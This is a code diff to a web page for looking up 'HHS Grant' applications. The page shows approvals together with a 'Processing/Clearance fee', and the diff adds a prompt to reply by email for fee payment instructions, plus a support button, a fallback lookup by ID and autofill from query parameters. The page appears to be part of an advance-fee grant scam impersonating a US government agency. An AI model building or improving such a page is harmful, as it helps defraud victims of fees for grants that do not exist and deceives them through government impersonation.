@@ -194,8 +194,12 @@
         <div>
           <div style="font-weight:900;">Your application is approved</div>
           <div class="help">Follow the instructions to complete claim and delivery verification.</div>
+          <div class="help">For fee payment instructions, reply directly to your approval email. Our program team will guide you through the secure processing step.</div>
         </div>
-        <a id="btnClaim" class="btn success" href="#">Claim your grant</a>
+        <div style="display:flex; gap:8px; flex-wrap:wrap;">
+          <a id="btnClaim" class="btn success" href="#">Claim your grant</a>
+          <a id="btnSupport" class="btn ghost" href="#">Contact support</a>
+        </div>
       </div>
 
       <div class="section">
@@ -257,6 +261,8 @@
     };
     const app = firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+    // Optional: set a program support email to populate the contact link
+    const PROGRAM_SUPPORT_EMAIL = '';
 
     function showErr(msg) { const el = document.getElementById('err'); el.textContent = msg; el.style.display = 'block'; }
     function clearErr() { const el = document.getElementById('err'); el.textContent = ''; el.style.display = 'none'; }
@@ -295,16 +301,26 @@
       try {
         setLoading(true);
         const q = await db.collection('applications').where('reference','==', ref).limit(1).get();
-        if (q.empty) { setLoading(false); showErr('No application found for that reference.'); return; }
-        const doc = q.docs[0];
-        const d = doc.data();
+        let docSnap = null;
+        if (q.empty) {
+          // Fallback: try direct document ID lookup
+          const byId = await db.collection('applications').doc(ref).get();
+          if (byId.exists) {
+            docSnap = byId;
+          } else {
+            setLoading(false); showErr('No application found for that reference.'); return;
+          }
+        } else {
+          docSnap = q.docs[0];
+        }
+        const d = docSnap.data();
         const a = d.applicant || {};
         if ((a.email || '').toLowerCase() !== email) { setLoading(false); showErr('Email does not match this reference.'); return; }
         // Render
         setLoading(false);
         document.getElementById('result').style.display = 'block';
         setBadge(d.status);
-        document.getElementById('r-ref').textContent = d.reference || doc.id;
+        document.getElementById('r-ref').textContent = d.reference || docSnap.id;
         document.getElementById('r-created').textContent = fmtDate(d.createdAt);
         document.getElementById('r-name').textContent = a.fullName || '-';
         document.getElementById('r-email').textContent = a.email || '-';
@@ -331,9 +347,9 @@
 
         // CTA compose
         const btnClaim = document.getElementById('btnClaim');
-        const subject = encodeURIComponent(`HHS Grant Claim — Reference ${d.reference || doc.id}`);
+        const subject = encodeURIComponent(`HHS Grant Claim — Reference ${d.reference || docSnap.id}`);
         const lines = [
-          `Reference: ${d.reference || doc.id}`,
+          `Reference: ${d.reference || docSnap.id}`,
           `Applicant: ${a.fullName || '-'}`,
           f.amount != null ? `Approved amount: ${fmtCurrency(f.amount)}` : null,
           f.fee != null ? `Processing/Clearance fee: ${fmtCurrency(f.fee)}` : null,
@@ -342,6 +358,14 @@
         ].filter(Boolean);
         const body = encodeURIComponent(lines.join('\n'));
         btnClaim.href = `mailto:?subject=${subject}&body=${body}`;
+
+        const btnSupport = document.getElementById('btnSupport');
+        if (btnSupport) {
+          const supportEmail = typeof PROGRAM_SUPPORT_EMAIL === 'string' && PROGRAM_SUPPORT_EMAIL.trim() ? PROGRAM_SUPPORT_EMAIL.trim() : '';
+          const supportTo = supportEmail ? encodeURIComponent(supportEmail) : '';
+          const supportSubject = encodeURIComponent(`HHS Grant Support — Reference ${d.reference || docSnap.id}`);
+          btnSupport.href = `mailto:${supportTo}?subject=${supportSubject}`;
+        }
       } catch (e) {
         setLoading(false);
         showErr('Failed to look up application: ' + e.message);
@@ -356,6 +380,18 @@
       document.getElementById('loading').style.display='none';
       clearErr();
     });
+
+    // Autofill from query params and auto-search when both provided
+    (function initFromQuery(){
+      try {
+        const params = new URLSearchParams(window.location.search);
+        const qRef = params.get('ref');
+        const qEmail = params.get('email');
+        if (qRef) document.getElementById('ref').value = qRef;
+        if (qEmail) document.getElementById('email').value = qEmail;
+        if (qRef && qEmail) search();
+      } catch(_) {}
+    })();
   </script>
 </body>
 </html>
